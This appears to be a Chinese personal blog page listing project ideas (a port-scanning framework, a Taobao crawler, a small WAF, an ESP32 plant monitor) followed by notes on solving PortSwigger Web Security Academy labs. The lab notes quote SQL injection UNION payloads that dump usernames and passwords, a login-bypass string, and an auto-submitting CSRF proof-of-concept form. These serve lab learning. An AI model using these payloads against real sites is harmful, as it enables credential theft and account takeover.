> 近期太忙没空更新博客，将就看下吧~

## 网安
1. [portswigger靶场经验杂谈](#portswigger靶场经验杂谈)

### 安全工具开发方向
1. [May I Help You 开发纪实](#may-i-help-you-开发纪实)
2. [个人博客版WAF思路](#个人博客版waf思路)

### 数据挖掘方向
1. [商业爬虫原型机构建思路](#商业爬虫原型机构建思路)


### 算法

### 物联网
1. [智能花盆观察平台](#智能花盆观察平台)


------
> ## May I Help You 开发纪实
2022年5月7日 定制化端口扫描框架思路

分为三个部分和一个核心：
- 核心是用来管理调度这三部分的程序
- 第一部分：
    - 前端：vue/react
    - 后端：springboot或Go(gin/goframe/http.server)
- 第二部分：
    - 信息收集
    - 根据收集来的端口信息去各大网站上找漏洞和POC
    - 生成测绘图
        - 域名-》子域名（one for all）=>ip 端口 cdn waf(放弃自动化扫描/代理池) C段->端口爆破->端口漏洞->web服务->web目录扫描->web爬虫->web漏洞
        - masscan扫全端口 nmap扫存活的端口
        - 被动扫描（针对域名 直接调 xray awvs w13scan等进行漏扫） 
        - 各大搜索引擎资料
- 第三部分 API：
    - http
    - RGP调试工具接入
    - 诱饵释放
        1. 真假ip
        2. 暴露白痴漏洞
    - 告警（企业微信机器人/钉钉机器人）

2022年5月9日 密码学工具
1. 摩斯密码
2. base64定制版
3. md5加解密工具
4. rsa加解密工具

-------

> # 商业爬虫原型机构建思路
2021年3月8日 构建淘宝定向数据爬虫
1. 收集淘宝的指定词语的所有数据、重定向方式、拦截方式、各大框架绕过方式
2. 给收集到的信息分类（默认词云）
3. 给定向爬虫弄个线程池，可以get一个定向爬虫线程的方式获取爬虫

------

> # 个人博客版WAF思路
- 需求：集成化、省内存、高效、扩展强

- 核心思路：拦截一切看上去不正常的操作

- 扩展思路：
    1. 设置http tcp rpg 三种接口方式通过指令调用功能
    2. 配置一个基于RPG接口的debug客户端
    3. syslog收集日志
    4. 自带web界面，提供框架允许前端接入

-------

> # 智能花盆观察平台
由tcp接入本地云，一盆花一个esp32
- 硬件材料：
    1. esp32
    2. dis1802
    3. sht20
    4. 无线充电模块
    5. GY30
    6. 土壤养分传感器
- 需求：
    1. tcp接入本地云
    2. 可做节点服务器，可做单一节点
    3. 自带web报表
    4. 带RPC接口可接入本地云进行调试


> # portswigger靶场经验杂谈

## SQL注入

>> 靶场地址: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
这题和第一题的注入点长得很像于是我就拿order by试了试，发现能报错
![SQL_INJECTION_UNION_NUMBER_COLUMNS](img\SQL_INJECTION_UNION_NUMBER_COLUMNS.png)
递减了下发现是三位的，然后就通关了

>> 靶场地址：https://portswigger.net/web-security/sql-injection/lab-login-bypass
发现几个疑似注入点：
https://acd31f741ee25a70c0a5287e00570021.web-security-academy.net/product?productId=2
https://acd31f741ee25a70c0a5287e00570021.web-security-academy.net/login
用脚本挨个试了后发现登录表单处可以注入：简单试了试字符型，eee --+ 发现居然能绕过登录。然后就通关了

>> 靶场： https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
根据页面提示，说这题和上一题很像。不过要找到包含文本的那一列。所以直接从上一个注入点接着弄
![sql_找可以显示文本的字段](img\sql_找可以显示文本的字段.png)
三个字段挨个试了一遍发现只有一个字段能显示文本，不能同时显示两个文本在页面看见多了一行：BEU8vZ 填入值后发现通关

>> 靶场：https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
    这题和上一题目一样直接给了用户信息：
```text
该数据库包含一个名为 的不同表users，其中的列名为username和password。
为解决实验室问题，执行SQL 注入 UNION攻击，检索所有用户名和密码，并使用该信息以administrator用户身份登录。
```

按照上一题的方法拿到了分成两个页面分别拿到了admin的账户和密码（这回只能输出一个了）（23bg3dp4cvn7mfhyja8j）
结果居然登录不了？？？看了下官方的提示
```text
使用 Burp Suite 拦截和修改设置产品类别过滤器的请求。
确定查询返回的列数以及哪些列包含文本数据。验证查询是否返回两列，其中只有一列包含文本，在category参数中使用如下所示的有效负载：

'+UNION+SELECT+NULL,'abc'--
使用以下负载来检索users表的内容：

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
验证应用程序的响应是否包含用户名和密码。
```
原来||还可以用来输出啊，学到了。最后发现，不是方法的问题，我把密码看错了。

![SQL注入UNION 攻击在单个列中检索多个值](img/SQL%E6%B3%A8%E5%85%A5UNION%20%E6%94%BB%E5%87%BB%E5%9C%A8%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%80%BC.png)

>> 靶场地址：https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

根据提示上说这个环境的数据库包含一个名为 的不同表`users`，其中的列名为`username`和`password`。为解决实验室问题，执行[SQL 注入 UNION](https://portswigger.net/web-security/sql-injection/union-attacks)攻击，检索所有用户名和密码，并使用该信息以`administrator`用户身份登录

但至于这个注入点在哪他也没细说，结合上一题的逻辑（查找可以显示文本的列），我用上一题的注入点试了试

![SQL注入UNION攻击，从其他表中检索数据1](img\SQL注入UNION攻击，从其他表中检索数据1.png)

古德，结合提示刚好两个字段：结果发现居然不行。都到这步了估计是语法的问题，然后挨个检查了下关键字发现是我把union的用法搞错了：[可以使两张毫不相干的表的查询结果拼接在一起输出，前提是两个查询的**列数**要相同。](https://blog.csdn.net/qq_45148387/article/details/116357408)

![SQL注入UNION攻击，从其他表中检索数据2](img\SQL注入UNION攻击，从其他表中检索数据2.png)

然后找了半天发现居然藏在文章里，还以为没查出来，结合提示。要求用admin登录，通关~

![SQL注入UNION攻击，从其他表中检索数据3](img\SQL注入UNION攻击，从其他表中检索数据3.png)

## CSRF
**CSRF，其中令牌验证取决于令牌是否存在**

>> 靶场地址：https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present

这个题做法和前面的类似，不过题目已经泄露了。直接把csrf参数给删了就能过了

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acbc1fe61f83437ec02767c300c50018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="323r&#64;normal&#45;user&#46;net" />
      <script>
    document.forms[0].submit();
</script>
    </form>
  </body>
</html>
```